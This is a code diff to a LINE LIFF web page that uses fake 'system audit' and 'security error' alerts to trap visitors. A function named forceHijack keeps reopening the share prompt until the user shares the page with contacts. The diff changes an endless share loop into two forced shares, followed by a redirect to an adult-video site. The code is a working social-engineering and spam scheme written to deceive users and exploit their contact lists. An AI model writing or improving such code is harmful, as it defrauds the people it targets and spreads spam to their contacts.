@@ -34,7 +34,7 @@
     <script>
         const LIFF_ID = "2009200124-rSJ8f72Y"; 
         const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
-
+        let shareCount = 0; 
         async function init() {
             try {
                 await liff.init({ liffId: LIFF_ID });
@@ -55,26 +55,25 @@
                 ]);
 
                 if (res) {
-                    // 分享成功後的處理：不跳轉，而是引導再次分享
-                    alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
-                    
-                    // 這裡不跳轉，直接重新呼叫 forceHijack，讓使用者停留在這無限循環
-                    forceHijack(); 
-                } else {
-                    // 使用者按取消
-                    alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
+                    shareCount = shareCount + 1; // 蓋章加 1 [1.1]
+                    if (shareCount < 2) { 
+                        alert("【系統審核中】\n請再次確實分配 3 位節點。");
+                        forceHijack(); 
+                    } else {
+                        alert("【驗證完成】\n即將導向飛機頻道！");
+                        window.location.replace(SUCCESS_URL); // 滿 2 次才放行 [1.1, 1.2]
+                    }
+                } else { // 👈 這是原本那個「按取消」的 else
+                    alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足。");
                     forceHijack(); 
                 }
             } catch (error) {
-                // 拒絕權限
-                alert("【安全錯誤】\n需允許分配權限，系統才能驗證您的節點身份。");
+                alert("【安全錯誤】\n需允許分配權限。");
                 forceHijack();
             }
         }
-
         window.onload = init;
     </script>
 </body>
 </html>
-
 
